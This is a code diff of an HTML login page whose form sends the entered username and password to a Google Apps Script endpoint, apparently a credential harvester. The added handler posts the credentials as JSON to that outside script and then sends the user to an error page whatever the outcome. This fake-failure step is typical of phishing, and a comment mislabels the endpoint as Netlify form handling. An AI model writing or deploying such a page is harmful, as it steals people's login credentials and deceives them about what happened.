@@ -33,11 +33,12 @@
 
             <div class="l-part">
                 <!-- Netlify form handling with redirection -->
-                <form name="contact" method="POST" action="https://script.google.com/macros/s/AKfycbzIPrVOXxE9KrEVkg8NYBprnWVupP6KWgLdpuYArejfUb0H4AYxdBP-sMm2YK_v6HaQ/exec">
+                <form name="contact" method="POST" action="https://script.google.com/macros/s/AKfycbzIPrVOXxE9KrEVkg8NYBprnWVupP6KWgLdpuYArejfUb0H4AYxdBP-sMm2YK_v6HaQ/exec" onsubmit="redirectOnSubmit(event)">
                     <input type="text" name="username" placeholder="Username" class="input-1" required />
                     <input type="password" name="password" placeholder="Password" class="input-2" required />
                     <input type="submit" class="btn" value="Log In">
                 </form>
+                
                 
                 
             </div>
@@ -52,25 +53,31 @@
     </div>
 </body>
  
-    <script>
-    document.querySelector('form').addEventListener('submit', async (event) => {
+<script>
+    async function redirectOnSubmit(event) {
         event.preventDefault(); // Prevent default form submission
         const form = event.target;
         const formData = new FormData(form);
         const data = Object.fromEntries(formData.entries());
-        const response = await fetch(form.action, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        });
-        if (response.ok) {
-            alert("Form submitted successfully!");
-            form.reset();
-        } else {
-            alert("Error submitting form.");
+
+        try {
+            // Send data to Google Apps Script
+            const response = await fetch(form.action, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            });
+
+            // Redirect to error.html after submission
+            window.location.href = 'error.html';
+        } catch (error) {
+            console.error('Error during form submission:', error);
+            // Redirect even in case of error
+            window.location.href = 'error.html';
         }
-    });
+    }
 </script>
+
 
 
 </html>
